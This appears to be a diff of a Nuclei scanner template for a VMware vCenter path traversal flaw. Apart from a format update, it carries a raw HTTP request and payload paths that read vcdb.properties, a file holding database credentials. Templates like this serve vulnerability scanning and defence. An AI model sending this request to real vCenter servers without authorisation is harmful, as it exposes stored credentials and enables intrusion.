@@ -12,9 +12,11 @@ info:
     cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
     cvss-score: 7.5
     cwe-id: CWE-22
+  metadata:
+    max-request: 3
   tags: vmware,lfi,vcenter
 
-requests:
+http:
   - raw:
       - |
         GET /eam/vib?id={{path}}\vcdb.properties HTTP/1.1
@@ -22,9 +24,9 @@ requests:
 
     payloads:
       path:
-        - "C:\\ProgramData\\VMware\\VMware+VirtualCenter"  # vCenter Server 5.5 and earlier (Windows 2008)
-        - "C:\\Documents+and+Settings\\All+Users\\Application+Data\\VMware\\VMware+VirtualCenter"  # Other Windows versions
-        - "C:\\ProgramData\\VMware\\vCenterServer\\cfg\\vmware-vpx"  # vCenter Server => 6.0
+        - "C:\\ProgramData\\VMware\\VMware+VirtualCenter" # vCenter Server 5.5 and earlier (Windows 2008)
+        - "C:\\Documents+and+Settings\\All+Users\\Application+Data\\VMware\\VMware+VirtualCenter" # Other Windows versions
+        - "C:\\ProgramData\\VMware\\vCenterServer\\cfg\\vmware-vpx" # vCenter Server => 6.0
 
     matchers-condition: and
     matchers:
@@ -35,5 +37,4 @@ requests:
       - type: status
         status:
           - 200
-
-# Enhanced by mp on 2022/08/01
+# digest: 4a0a004730450220023ea37bc596200e032a8253660e60d373d4aae6649180da3a4c104bd00e9f0d022100fd4cd6cc52337c9d76b4c9677a06d9bfdf464278af5fb2094e5d9d835d8d8323:922c64590222798bb761d5b6d8e72950
